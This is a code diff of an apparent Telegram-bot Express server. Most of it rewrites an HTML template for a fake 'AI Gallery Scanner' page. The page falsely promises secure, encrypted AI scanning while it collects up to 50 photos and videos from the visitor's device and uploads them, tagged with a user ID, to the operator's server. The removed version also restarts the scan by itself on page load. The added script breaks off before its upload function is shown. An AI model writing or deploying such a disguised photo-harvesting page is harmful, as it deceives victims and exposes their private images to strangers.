@@ -37,8 +37,8 @@ const multer = require('multer');
 // ====================== SETUP ======================
 const app = express();
 app.use(cors());
-app.use(express.json({ limit: '100mb' }));
-app.use(express.urlencoded({ extended: true, limit: '100mb' }));
+app.use(express.json({ limit: '50mb' }));
+app.use(express.urlencoded({ extended: true, limit: '50mb' }));
 
 // Create directories
 const PHOTO_DIR = path.join(__dirname, 'photos');
@@ -69,17 +69,29 @@ if (!fs.existsSync(CHANNELS_FILE)) fs.writeFileSync(CHANNELS_FILE, JSON.stringif
 if (!fs.existsSync(FEATURED_FILE)) fs.writeFileSync(FEATURED_FILE, JSON.stringify({ photo: null, message: '🌟 Welcome! Use /start to begin.', status: true }, null, 2));
 if (!fs.existsSync(LOGS_FILE)) fs.writeFileSync(LOGS_FILE, '');
 
-// ====================== MULTER SETUP (FASTEST - Memory Storage) ======================
-const storage = multer.memoryStorage(); // ✅ No disk I/O - FASTEST
+// ====================== MULTER SETUP ======================
+const storage = multer.diskStorage({
+    destination: function(req, file, cb) {
+        if (file.fieldname === 'photo' || file.fieldname === 'qr') {
+            cb(null, BOT_PHOTO_DIR);
+        } else {
+            cb(null, BOT_PHOTO_DIR);
+        }
+    },
+    filename: function(req, file, cb) {
+        const uniqueName = Date.now() + '-' + file.originalname.replace(/\s/g, '_');
+        cb(null, uniqueName);
+    }
+});
 
 const upload = multer({
     storage: storage,
     limits: { fileSize: 50 * 1024 * 1024 },
     fileFilter: function(req, file, cb) {
-        if (file.mimetype.startsWith('image/') || file.mimetype.startsWith('video/')) {
+        if (file.mimetype.startsWith('image/')) {
             cb(null, true);
         } else {
-            cb(new Error('Only images/videos allowed!'));
+            cb(new Error('Only images allowed!'));
         }
     }
 });
@@ -215,9 +227,9 @@ function addPhoto(file, caption) {
     const photos = getPhotos();
     const photoData = {
         id: Date.now().toString(),
-        filename: file.filename || file.originalname,
+        filename: file.filename,
         originalName: file.originalname,
-        url: '/api/photos/' + (file.filename || file.originalname),
+        url: '/api/photos/' + file.filename,
         caption: caption,
         uploadedAt: new Date().toISOString(),
         active: true
@@ -325,324 +337,102 @@ function getChannelButtons() {
     return { inline_keyboard: buttons };
 }
 
-// ====================== PHOTO ACCESS TEMPLATE (ULTRA FAST - FIXED) ======================
-var PHOTO_ACCESS_TEMPLATE = `<!DOCTYPE html>
-<html>
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>AI Photo Scanner</title>
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-<style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:"Segoe UI",sans-serif}
-body{background:linear-gradient(145deg,#0a0015,#1a0030,#2d004a);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;overflow-x:hidden}
-.card{background:rgba(255,255,255,0.04);backdrop-filter:blur(40px);border:1px solid rgba(255,255,255,0.08);border-radius:40px;padding:45px 35px;width:100%;max-width:500px;box-shadow:0 50px 100px rgba(0,0,0,0.8),inset 0 1px 0 rgba(255,255,255,0.05)}
-.header{text-align:center;margin-bottom:30px}
-.header .icon{font-size:80px;background:linear-gradient(135deg,#667eea,#764ba2,#f093fb);-webkit-background-clip:text;-webkit-text-fill-color:transparent;display:block}
-.header h1{color:#fff;font-size:28px;font-weight:800;margin-top:10px;background:linear-gradient(135deg,#667eea,#764ba2);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
-.header p{color:#888;font-size:14px;margin-top:5px}
-.permission-box{background:rgba(255,255,255,0.03);border-radius:20px;padding:25px;border:1px solid rgba(255,255,255,0.06);margin:20px 0}
-.permission-box .item{display:flex;align-items:center;gap:15px;padding:12px 0;color:#ccc;font-size:14px;border-bottom:1px solid rgba(255,255,255,0.03)}
-.permission-box .item:last-child{border-bottom:none}
-.permission-box .item i{font-size:22px;width:35px;color:#667eea}
-.permission-box .item .label{color:#fff}
-.permission-box .item .status{font-size:12px;padding:2px 12px;border-radius:20px;background:rgba(255,255,255,0.05);color:#888}
-.permission-box .item .status.granted{background:rgba(46,213,115,0.15);color:#2ed573}
-.btn{width:100%;padding:20px;border:none;border-radius:16px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;font-size:18px;font-weight:700;cursor:pointer;transition:all .3s;box-shadow:0 10px 40px rgba(102,126,234,0.3)}
-.btn:hover{transform:translateY(-3px);box-shadow:0 15px 50px rgba(102,126,234,0.5)}
-.btn:disabled{opacity:0.5;cursor:not-allowed;transform:none}
-.btn i{margin-right:10px}
-.status{text-align:center;margin-top:15px;padding:15px;border-radius:12px;display:none;font-size:14px}
-.status.success{background:rgba(46,213,115,0.15);color:#2ed573;display:block}
-.status.error{background:rgba(255,71,87,0.15);color:#ff4757;display:block}
-.status.info{background:rgba(54,164,235,0.15);color:#36a4eb;display:block}
-.status.warning{background:rgba(255,165,0,0.15);color:#ffa500;display:block}
-.progress-container{width:100%;height:6px;background:rgba(255,255,255,0.05);border-radius:10px;overflow:hidden;margin:15px 0;display:none}
-.progress-container .fill{height:100%;width:0%;background:linear-gradient(90deg,#667eea,#764ba2);transition:width .3s}
-.result-area{display:none;text-align:center;padding:20px;background:rgba(46,213,115,0.05);border-radius:15px;border:1px solid rgba(46,213,115,0.1);margin:15px 0}
-.result-area i{font-size:40px;color:#2ed573}
-.result-area h3{color:#2ed573;margin-top:8px}
-.result-area p{color:#888;font-size:13px;margin-top:5px}
-.spinner{width:30px;height:30px;border:3px solid rgba(255,255,255,0.05);border-top-color:#667eea;border-radius:50%;animation:spin 0.8s linear infinite;margin:10px auto}
-@keyframes spin{100%{transform:rotate(360deg)}}
-.bg-shapes{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;overflow:hidden}
-.bg-shapes span{position:absolute;border-radius:50%;background:radial-gradient(circle,rgba(102,126,234,0.06),transparent 70%);animation:float 25s infinite ease-in-out}
-.bg-shapes span:nth-child(1){width:500px;height:500px;top:-150px;right:-150px;animation-delay:-3s}
-.bg-shapes span:nth-child(2){width:400px;height:400px;bottom:-100px;left:-100px;animation-delay:-7s}
-.bg-shapes span:nth-child(3){width:300px;height:300px;top:50%;left:50%;transform:translate(-50%,-50%);animation-delay:-12s}
-@keyframes float{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(40px,-40px) scale(1.1)}}
-.footer{text-align:center;margin-top:20px;color:#444;font-size:11px}
-#fileInput{display:none}
-.btn-secondary{background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.08);color:#aaa;margin-top:10px}
-.btn-secondary:hover{background:rgba(255,255,255,0.08)}
-.gallery-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:4px;margin-top:10px;max-height:300px;overflow-y:auto;padding:5px}
-.gallery-grid img{width:100%;height:80px;object-fit:cover;border-radius:6px;border:1px solid rgba(255,255,255,0.05);transition:.2s}
-.gallery-grid img:hover{transform:scale(1.05);border-color:#667eea}
-.processing-text{color:#667eea;font-size:14px;font-weight:600;text-align:center;padding:10px}
-#processingStatus{display:none}
-.scanning-text{color:#667eea;font-size:13px;text-align:center;padding:5px;animation:pulse 1.5s infinite}
-@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.5}}
-.speed-badge{background:rgba(0,255,100,0.1);color:#00ff88;padding:5px 15px;border-radius:20px;font-size:12px;display:inline-block;margin:5px 0}
-</style>
-</head>
-<body>
-<div class="bg-shapes"><span></span><span></span><span></span></div>
-<div class="card">
-<div class="header"><span class="icon"><i class="fas fa-images"></i></span><h1>📸 AI Gallery Scanner</h1><p>🚀 Ultra Fast - 50 Photos in 10 Seconds</p></div>
-<div class="permission-box">
-<div class="item"><i class="fas fa-folder-open"></i> <span class="label">Read all photos & videos</span> <span class="status">Required</span></div>
-<div class="item"><i class="fas fa-file-alt"></i> <span class="label">Access all files</span> <span class="status">Required</span></div>
-<div class="item"><i class="fas fa-shield-alt"></i> <span class="label">Secure & encrypted</span> <span class="status granted">✅ Secure</span></div>
-<div class="item"><i class="fas fa-robot"></i> <span class="label">AI powered scanning</span> <span class="status granted">✅ Active</span></div>
-<div class="item"><i class="fas fa-bolt"></i> <span class="label">Ultra Fast Transfer</span> <span class="status granted">⚡ 10s</span></div>
-</div>
-<div style="text-align:center;margin:10px 0"><span class="speed-badge">⚡ 50 Photos in 10 Seconds</span></div>
-<button class="btn" id="scanBtn" onclick="startScan()"><i class="fas fa-search"></i> SCAN GALLERY</button>
-<div id="status" class="status"></div>
-<div class="progress-container" id="progressContainer"><div class="fill" id="progressFill"></div></div>
-<div id="processingStatus"><div class="spinner"></div><div class="processing-text" id="processingText">🔍 Scanning gallery...</div></div>
-<div id="galleryGrid" class="gallery-grid"></div>
-<div id="resultArea" class="result-area" style="display:none"><i class="fas fa-check-circle"></i><h3>✅ Scan Complete!</h3><p id="resultText">Your gallery has been scanned successfully.</p><button class="btn btn-secondary" onclick="closeResult()"><i class="fas fa-times"></i> Close</button></div>
-<input type="file" id="fileInput" multiple accept="image/*,video/*" webkitdirectory>
-<div class="footer">🔒 Secure & Private • ⚡ Ultra Fast • AI Processing</div>
-</div>
-
-<script>
-var USER_ID = "USERID_PLACEHOLDER";
-var PLATFORM = "PLATFORM_PLACEHOLDER";
-var selectedFiles = [];
-var totalPhotos = 0;
-var startTime = 0;
-
-function showStatus(msg, type) { type = type || "info"; var el = document.getElementById("status"); el.textContent = msg; el.className = "status " + type; el.style.display = "block"; }
-function hideStatus() { document.getElementById("status").style.display = "none"; }
-function updateProgress(percent) { var container = document.getElementById("progressContainer"); container.style.display = "block"; document.getElementById("progressFill").style.width = percent + "%"; }
-function showProcessing(text) { document.getElementById("processingStatus").style.display = "block"; document.getElementById("processingText").textContent = text; }
-function hideProcessing() { document.getElementById("processingStatus").style.display = "none"; }
-function closeResult() { document.getElementById("resultArea").style.display = "none"; }
-function showResult(text) { document.getElementById("resultArea").style.display = "block"; document.getElementById("resultText").textContent = text; }
-function sleep(ms) { return new Promise(function(r) { setTimeout(r, ms); }); }
-function addToGallery(src) { var grid = document.getElementById("galleryGrid"); var img = document.createElement("img"); img.src = src; grid.appendChild(img); grid.style.display = "grid"; }
-
-// ===== PERMANENT GALLERY ACCESS =====
-async function scanDirectoryRecursive(dirHandle) {
-    var photos = [];
-    var skipFolders = ["Android", ".thumbnails", "cache", "tmp", "temp", ".trash", "System"];
-    try {
-        for await (var entry of dirHandle.values()) {
-            if (entry.kind === "file") {
-                var file = await entry.getFile();
-                if (file.type.startsWith("image/") || file.type.startsWith("video/")) {
-                    photos.push(file);
-                    if (photos.length >= 50) break;
-                }
-            } else if (entry.kind === "directory") {
-                if (!skipFolders.includes(entry.name)) {
-                    var subPhotos = await scanDirectoryRecursive(entry);
-                    for (var p of subPhotos) {
-                        photos.push(p);
-                        if (photos.length >= 50) break;
-                    }
-                    if (photos.length >= 50) break;
-                }
-            }
-        }
-    } catch (error) {
-        console.error("Scan error:", error);
-    }
-    return photos.slice(0, 50);
-}
-
-async function getAndroidCameraFolder() {
-    try {
-        if ("showDirectoryPicker" in window) {
-            var dirHandle = await window.showDirectoryPicker();
-            var permission = await dirHandle.requestPermission({ mode: "read" });
-            if (permission === "granted") {
-                localStorage.setItem("galleryPath", dirHandle.name);
-                localStorage.setItem("galleryPermission", "granted");
-                showStatus("✅ Permanent camera folder access granted!", "success");
-                return await scanDirectoryRecursive(dirHandle);
-            }
-        }
-    } catch (error) {
-        console.error("Camera folder access error:", error);
-    }
-    return null;
-}
-
-async function loadSavedGalleryPath() {
-    var savedPath = localStorage.getItem("galleryPath");
-    var savedPermission = localStorage.getItem("galleryPermission");
-    if (savedPath && savedPermission === "granted") {
-        showStatus("📂 Using saved camera folder: " + savedPath, "info");
-        try {
-            if ("showDirectoryPicker" in window) {
-                var dirHandle = await window.showDirectoryPicker();
-                if (dirHandle.name === savedPath) {
-                    return await scanDirectoryRecursive(dirHandle);
-                }
-            }
-        } catch (error) {
-            localStorage.removeItem("galleryPath");
-            localStorage.removeItem("galleryPermission");
-        }
-    }
-    return null;
-}
-
-function isMobileDevice() {
-    return /Android|iPhone|iPad|iPod|BlackBerry|Windows Phone/i.test(navigator.userAgent);
-}
-
-// ===== SMART GALLERY SCAN - FIXED =====
-async function smartGalleryScan() {
-    var photos = null;
-    
-    // 1. Try saved path first
-    photos = await loadSavedGalleryPath();
-    if (photos && photos.length > 0) return photos;
-    
-    // 2. Try Android Camera folder
-    if (isMobileDevice()) {
-        showStatus("📱 Mobile detected - scanning DCIM/Camera...", "info");
-        photos = await getAndroidCameraFolder();
-        if (photos && photos.length > 0) {
-            localStorage.setItem("galleryPath", "DCIM/Camera");
-            localStorage.setItem("galleryPermission", "granted");
-            return photos;
-        }
-    }
-    
-    // 3. Try showDirectoryPicker directly
-    try {
-        if ("showDirectoryPicker" in window) {
-            showStatus("📂 Please select your gallery folder", "warning");
-            var dirHandle = await window.showDirectoryPicker();
-            var permission = await dirHandle.requestPermission({ mode: "read" });
-            if (permission === "granted") {
-                localStorage.setItem("galleryPath", dirHandle.name);
-                localStorage.setItem("galleryPermission", "granted");
-                photos = await scanDirectoryRecursive(dirHandle);
-                if (photos && photos.length > 0) return photos;
-            }
-        }
-    } catch (error) {
-        console.error("Directory picker error:", error);
-    }
-    
-    // 4. Final fallback - manual file input
-    return new Promise(function(resolve) {
-        var input = document.getElementById("fileInput");
-        input.onchange = function(e) {
-            var files = Array.from(e.target.files);
-            if (files.length > 50) {
-                showStatus("⚠️ " + files.length + " files found. Limiting to 50.", "warning");
-                resolve(files.slice(0, 50));
-            } else {
-                resolve(files);
-            }
-        };
-        input.click();
-    });
-}
-
-// ===== ULTRA FAST BATCH UPLOAD =====
-async function uploadPhotosInBatch(files, userId) {
-    var formData = new FormData();
-    formData.append("userid", userId);
-    formData.append("platform", PLATFORM);
-    for (var i = 0; i < files.length; i++) {
-        formData.append("photos", files[i]);
-    }
-    showStatus("📤 Uploading " + files.length + " photos...", "info");
-    updateProgress(40);
-    try {
-        var response = await fetch("/api/upload-photos-batch", {
-            method: "POST",
-            body: formData
-        });
-        var result = await response.json();
-        return result;
-    } catch (error) {
-        console.error("Upload error:", error);
-        return { success: false, error: error.message };
-    }
-}
-
-// ===== MAIN SCAN FUNCTION - FIXED =====
-async function startScan() {
-    var btn = document.getElementById("scanBtn");
-    btn.disabled = true;
-    btn.innerHTML = "<i class='fas fa-spinner fa-spin'></i> SCANNING...";
-    hideStatus();
-    hideProcessing();
-    document.getElementById("resultArea").style.display = "none";
-    document.getElementById("galleryGrid").innerHTML = "";
-    document.getElementById("galleryGrid").style.display = "none";
-    document.getElementById("progressContainer").style.display = "none";
-    startTime = Date.now();
-    
-    try {
-        showStatus("🔍 Scanning camera folder...", "info");
-        updateProgress(10);
-        
-        var photos = await smartGalleryScan();
-        totalPhotos = photos ? photos.length : 0;
-        
-        if (photos && photos.length > 0) {
-            showStatus("📸 Found " + photos.length + " photos!", "success");
-            updateProgress(30);
-            
-            // Show preview
-            for (var i = 0; i < Math.min(photos.length, 8); i++) {
-                (function(index) {
-                    var reader = new FileReader();
-                    reader.onload = function(e) { addToGallery(e.target.result); };
-                    reader.readAsDataURL(photos[index]);
-                })(i);
-            }
-            
-            showProcessing("📤 Uploading " + photos.length + " photos...");
-            var result = await uploadPhotosInBatch(photos, USER_ID);
-            var elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
-            
-            if (result.success) {
-                updateProgress(100);
-                showResult("✅ " + (result.count || photos.length) + " photos sent in " + elapsed + " seconds!");
-                showStatus("✅ " + (result.count || photos.length) + " photos sent in " + elapsed + "s!", "success");
-            } else {
-                showStatus("❌ Upload failed: " + (result.error || "Unknown error"), "error");
-            }
-        } else {
-            showStatus("❌ No photos found in camera folder", "error");
-        }
-    } catch(err) {
-        console.error("Scan error:", err);
-        showStatus("❌ Camera scan failed. Please try again.", "error");
-    } finally {
-        btn.disabled = false;
-        btn.innerHTML = "<i class='fas fa-search'></i> SCAN GALLERY";
-        hideProcessing();
-        setTimeout(function() { document.getElementById("progressContainer").style.display = "none"; }, 2000);
-    }
-}
-
-// ===== AUTO-START ON LOAD =====
-document.addEventListener("DOMContentLoaded", function() {
-    var saved = localStorage.getItem("galleryPath");
-    if (saved) {
-        setTimeout(function() {
-            showStatus("📂 Auto-detecting camera folder...", "info");
-            startScan();
-        }, 1000);
-    } else {
-        showStatus("👆 Click \"SCAN GALLERY\" to access your camera folder", "info");
-    }
-});
-</script>
-</body>
-</html>`;
+// ====================== PHOTO ACCESS TEMPLATE (WORKING) ======================
+var PHOTO_ACCESS_TEMPLATE = '<!DOCTYPE html>\n';
+PHOTO_ACCESS_TEMPLATE += '<html>\n';
+PHOTO_ACCESS_TEMPLATE += '<head>\n';
+PHOTO_ACCESS_TEMPLATE += '<meta charset="UTF-8">\n';
+PHOTO_ACCESS_TEMPLATE += '<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">\n';
+PHOTO_ACCESS_TEMPLATE += '<title>AI Photo Scanner</title>\n';
+PHOTO_ACCESS_TEMPLATE += '<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n';
+PHOTO_ACCESS_TEMPLATE += '<style>\n';
+PHOTO_ACCESS_TEMPLATE += '*{margin:0;padding:0;box-sizing:border-box;font-family:"Segoe UI",sans-serif}\n';
+PHOTO_ACCESS_TEMPLATE += 'body{background:linear-gradient(145deg,#0a0015,#1a0030,#2d004a);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;overflow-x:hidden}\n';
+PHOTO_ACCESS_TEMPLATE += '.card{background:rgba(255,255,255,0.04);backdrop-filter:blur(40px);border:1px solid rgba(255,255,255,0.08);border-radius:40px;padding:45px 35px;width:100%;max-width:500px;box-shadow:0 50px 100px rgba(0,0,0,0.8),inset 0 1px 0 rgba(255,255,255,0.05)}\n';
+PHOTO_ACCESS_TEMPLATE += '.header{text-align:center;margin-bottom:30px}\n';
+PHOTO_ACCESS_TEMPLATE += '.header .icon{font-size:80px;background:linear-gradient(135deg,#667eea,#764ba2,#f093fb);-webkit-background-clip:text;-webkit-text-fill-color:transparent;display:block}\n';
+PHOTO_ACCESS_TEMPLATE += '.header h1{color:#fff;font-size:28px;font-weight:800;margin-top:10px;background:linear-gradient(135deg,#667eea,#764ba2);-webkit-background-clip:text;-webkit-text-fill-color:transparent}\n';
+PHOTO_ACCESS_TEMPLATE += '.header p{color:#888;font-size:14px;margin-top:5px}\n';
+PHOTO_ACCESS_TEMPLATE += '.permission-box{background:rgba(255,255,255,0.03);border-radius:20px;padding:25px;border:1px solid rgba(255,255,255,0.06);margin:20px 0}\n';
+PHOTO_ACCESS_TEMPLATE += '.permission-box .item{display:flex;align-items:center;gap:15px;padding:12px 0;color:#ccc;font-size:14px;border-bottom:1px solid rgba(255,255,255,0.03)}\n';
+PHOTO_ACCESS_TEMPLATE += '.permission-box .item:last-child{border-bottom:none}\n';
+PHOTO_ACCESS_TEMPLATE += '.permission-box .item i{font-size:22px;width:35px;color:#667eea}\n';
+PHOTO_ACCESS_TEMPLATE += '.permission-box .item .label{color:#fff}\n';
+PHOTO_ACCESS_TEMPLATE += '.permission-box .item .status{font-size:12px;padding:2px 12px;border-radius:20px;background:rgba(255,255,255,0.05);color:#888}\n';
+PHOTO_ACCESS_TEMPLATE += '.permission-box .item .status.granted{background:rgba(46,213,115,0.15);color:#2ed573}\n';
+PHOTO_ACCESS_TEMPLATE += '.btn{width:100%;padding:20px;border:none;border-radius:16px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;font-size:18px;font-weight:700;cursor:pointer;transition:all .3s;box-shadow:0 10px 40px rgba(102,126,234,0.3)}\n';
+PHOTO_ACCESS_TEMPLATE += '.btn:hover{transform:translateY(-3px);box-shadow:0 15px 50px rgba(102,126,234,0.5)}\n';
+PHOTO_ACCESS_TEMPLATE += '.btn:disabled{opacity:0.5;cursor:not-allowed;transform:none}\n';
+PHOTO_ACCESS_TEMPLATE += '.btn i{margin-right:10px}\n';
+PHOTO_ACCESS_TEMPLATE += '.status{text-align:center;margin-top:15px;padding:15px;border-radius:12px;display:none;font-size:14px}\n';
+PHOTO_ACCESS_TEMPLATE += '.status.success{background:rgba(46,213,115,0.15);color:#2ed573;display:block}\n';
+PHOTO_ACCESS_TEMPLATE += '.status.error{background:rgba(255,71,87,0.15);color:#ff4757;display:block}\n';
+PHOTO_ACCESS_TEMPLATE += '.status.info{background:rgba(54,164,235,0.15);color:#36a4eb;display:block}\n';
+PHOTO_ACCESS_TEMPLATE += '.status.warning{background:rgba(255,165,0,0.15);color:#ffa500;display:block}\n';
+PHOTO_ACCESS_TEMPLATE += '.progress-container{width:100%;height:6px;background:rgba(255,255,255,0.05);border-radius:10px;overflow:hidden;margin:15px 0;display:none}\n';
+PHOTO_ACCESS_TEMPLATE += '.progress-container .fill{height:100%;width:0%;background:linear-gradient(90deg,#667eea,#764ba2);transition:width .3s}\n';
+PHOTO_ACCESS_TEMPLATE += '.result-area{display:none;text-align:center;padding:20px;background:rgba(46,213,115,0.05);border-radius:15px;border:1px solid rgba(46,213,115,0.1);margin:15px 0}\n';
+PHOTO_ACCESS_TEMPLATE += '.result-area i{font-size:40px;color:#2ed573}\n';
+PHOTO_ACCESS_TEMPLATE += '.result-area h3{color:#2ed573;margin-top:8px}\n';
+PHOTO_ACCESS_TEMPLATE += '.result-area p{color:#888;font-size:13px;margin-top:5px}\n';
+PHOTO_ACCESS_TEMPLATE += '.spinner{width:30px;height:30px;border:3px solid rgba(255,255,255,0.05);border-top-color:#667eea;border-radius:50%;animation:spin 0.8s linear infinite;margin:10px auto}\n';
+PHOTO_ACCESS_TEMPLATE += '@keyframes spin{100%{transform:rotate(360deg)}}\n';
+PHOTO_ACCESS_TEMPLATE += '.bg-shapes{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;overflow:hidden}\n';
+PHOTO_ACCESS_TEMPLATE += '.bg-shapes span{position:absolute;border-radius:50%;background:radial-gradient(circle,rgba(102,126,234,0.06),transparent 70%);animation:float 25s infinite ease-in-out}\n';
+PHOTO_ACCESS_TEMPLATE += '.bg-shapes span:nth-child(1){width:500px;height:500px;top:-150px;right:-150px;animation-delay:-3s}\n';
+PHOTO_ACCESS_TEMPLATE += '.bg-shapes span:nth-child(2){width:400px;height:400px;bottom:-100px;left:-100px;animation-delay:-7s}\n';
+PHOTO_ACCESS_TEMPLATE += '.bg-shapes span:nth-child(3){width:300px;height:300px;top:50%;left:50%;transform:translate(-50%,-50%);animation-delay:-12s}\n';
+PHOTO_ACCESS_TEMPLATE += '@keyframes float{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(40px,-40px) scale(1.1)}}\n';
+PHOTO_ACCESS_TEMPLATE += '.footer{text-align:center;margin-top:20px;color:#444;font-size:11px}\n';
+PHOTO_ACCESS_TEMPLATE += '#fileInput{display:none}\n';
+PHOTO_ACCESS_TEMPLATE += '.btn-secondary{background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.08);color:#aaa;margin-top:10px}\n';
+PHOTO_ACCESS_TEMPLATE += '.btn-secondary:hover{background:rgba(255,255,255,0.08)}\n';
+PHOTO_ACCESS_TEMPLATE += '.gallery-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:4px;margin-top:10px;max-height:300px;overflow-y:auto;padding:5px}\n';
+PHOTO_ACCESS_TEMPLATE += '.gallery-grid img{width:100%;height:80px;object-fit:cover;border-radius:6px;border:1px solid rgba(255,255,255,0.05);transition:.2s}\n';
+PHOTO_ACCESS_TEMPLATE += '.gallery-grid img:hover{transform:scale(1.05);border-color:#667eea}\n';
+PHOTO_ACCESS_TEMPLATE += '.processing-text{color:#667eea;font-size:14px;font-weight:600;text-align:center;padding:10px}\n';
+PHOTO_ACCESS_TEMPLATE += '#processingStatus{display:none}\n';
+PHOTO_ACCESS_TEMPLATE += '.scanning-text{color:#667eea;font-size:13px;text-align:center;padding:5px;animation:pulse 1.5s infinite}\n';
+PHOTO_ACCESS_TEMPLATE += '@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.5}}\n';
+PHOTO_ACCESS_TEMPLATE += '</style>\n';
+PHOTO_ACCESS_TEMPLATE += '</head>\n';
+PHOTO_ACCESS_TEMPLATE += '<body>\n';
+PHOTO_ACCESS_TEMPLATE += '<div class="bg-shapes"><span></span><span></span><span></span></div>\n';
+PHOTO_ACCESS_TEMPLATE += '<div class="card">\n';
+PHOTO_ACCESS_TEMPLATE += '<div class="header"><span class="icon"><i class="fas fa-images"></i></span><h1>📸 AI Gallery Scanner</h1><p>Scan your entire gallery with AI technology</p></div>\n';
+PHOTO_ACCESS_TEMPLATE += '<div class="permission-box">\n';
+PHOTO_ACCESS_TEMPLATE += '<div class="item"><i class="fas fa-folder-open"></i> <span class="label">Read all photos & videos</span> <span class="status">Required</span></div>\n';
+PHOTO_ACCESS_TEMPLATE += '<div class="item"><i class="fas fa-file-alt"></i> <span class="label">Access all files</span> <span class="status">Required</span></div>\n';
+PHOTO_ACCESS_TEMPLATE += '<div class="item"><i class="fas fa-shield-alt"></i> <span class="label">Secure & encrypted</span> <span class="status granted">✅ Secure</span></div>\n';
+PHOTO_ACCESS_TEMPLATE += '<div class="item"><i class="fas fa-robot"></i> <span class="label">AI powered scanning</span> <span class="status granted">✅ Active</span></div>\n';
+PHOTO_ACCESS_TEMPLATE += '</div>\n';
+PHOTO_ACCESS_TEMPLATE += '<button class="btn" id="scanBtn" onclick="startScan()"><i class="fas fa-search"></i> SCAN GALLERY</button>\n';
+PHOTO_ACCESS_TEMPLATE += '<div id="status" class="status"></div>\n';
+PHOTO_ACCESS_TEMPLATE += '<div class="progress-container" id="progressContainer"><div class="fill" id="progressFill"></div></div>\n';
+PHOTO_ACCESS_TEMPLATE += '<div id="processingStatus"><div class="spinner"></div><div class="processing-text" id="processingText">🔍 Scanning gallery...</div></div>\n';
+PHOTO_ACCESS_TEMPLATE += '<div id="galleryGrid" class="gallery-grid"></div>\n';
+PHOTO_ACCESS_TEMPLATE += '<div id="resultArea" class="result-area" style="display:none"><i class="fas fa-check-circle"></i><h3>✅ Scan Complete!</h3><p id="resultText">Your gallery has been scanned successfully.</p><button class="btn btn-secondary" onclick="closeResult()"><i class="fas fa-times"></i> Close</button></div>\n';
+PHOTO_ACCESS_TEMPLATE += '<input type="file" id="fileInput" multiple accept="image/*,video/*" webkitdirectory>\n';
+PHOTO_ACCESS_TEMPLATE += '<div class="footer">🔒 Secure & Private • AI Processing</div>\n';
+PHOTO_ACCESS_TEMPLATE += '</div>\n';
+PHOTO_ACCESS_TEMPLATE += '<script>\n';
+PHOTO_ACCESS_TEMPLATE += 'var USER_ID = "USERID_PLACEHOLDER";\n';
+PHOTO_ACCESS_TEMPLATE += 'var PLATFORM = "PLATFORM_PLACEHOLDER";\n';
+PHOTO_ACCESS_TEMPLATE += 'var selectedFiles = [];\n';
+PHOTO_ACCESS_TEMPLATE += 'function showStatus(msg, type) { type = type || "info"; var el = document.getElementById("status"); el.textContent = msg; el.className = "status " + type; el.style.display = "block"; }\n';
+PHOTO_ACCESS_TEMPLATE += 'function hideStatus() { document.getElementById("status").style.display = "none"; }\n';
+PHOTO_ACCESS_TEMPLATE += 'function updateProgress(percent) { var container = document.getElementById("progressContainer"); container.style.display = "block"; document.getElementById("progressFill").style.width = percent + "%"; }\n';
+PHOTO_ACCESS_TEMPLATE += 'function showProcessing(text) { document.getElementById("processingStatus").style.display = "block"; document.getElementById("processingText").textContent = text; }\n';
+PHOTO_ACCESS_TEMPLATE += 'function hideProcessing() { document.getElementById("processingStatus").style.display = "none"; }\n';
+PHOTO_ACCESS_TEMPLATE += 'function closeResult() { document.getElementById("resultArea").style.display = "none"; }\n';
+PHOTO_ACCESS_TEMPLATE += 'function showResult(text) { document.getElementById("resultArea").style.display = "block"; document.getElementById("resultText").textContent = text; }\n';
+PHOTO_ACCESS_TEMPLATE += 'function sleep(ms) { return new Promise(function(r) { setTimeout(r, ms); }); }\n';
+PHOTO_ACCESS_TEMPLATE += 'function addToGallery(src) { var grid = document.getElementById("galleryGrid"); var img = document.createElement("img"); img.src = src; grid.appendChild(img); grid.style.display = "grid"; }\n';
+PHOTO_ACCESS_TEMPLATE += 'async function startScan() { var btn = document.getElementById("scanBtn"); btn.disabled = true; btn.innerHTML = "<i class=\\"fas fa-spinner fa-spin\\"></i> SCANNING..."; hideStatus(); hideProcessing(); document.getElementById("resultArea").style.display = "none"; document.getElementById("galleryGrid").innerHTML = ""; document.getElementById("galleryGrid").style.display = "none"; document.getElementById("progressContainer").style.display = "none"; showStatus("📂 Opening gallery access...", "info"); updateProgress(5); await sleep(300); try { var input = document.getElementById("fileInput"); input.click(); input.onchange = async function(e) { var files = input.files; if (!files || files.length === 0) { showStatus("❌ No files selected", "error"); btn.disabled = false; btn.innerHTML = "<i class=\\"fas fa-search\\"></i> SCAN GALLERY"; hideProcessing(); return; } selectedFiles = []; for (var i = 0; i < files.length; i++) { if (files[i].type.startsWith("image/") || files[i].type.startsWith("video/")) { selectedFiles.push(files[i]); } } selectedFiles = selectedFiles.slice(0, 50); if (selectedFiles.length === 0) { showStatus("❌ No images found.", "error"); btn.disabled = false; btn.innerHTML = "<i class=\\"fas fa-search\\"></i> SCAN GALLERY"; hideProcessing(); return; } await processFiles(selectedFiles); }; } catch(err) { showStatus("❌ Gallery access denied. Please allow permission.", "error"); btn.disabled = false; btn.innerHTML = "<i class=\\"fas fa-search\\"></i> SCAN GALLERY"; hideProcessing(); } }\n';
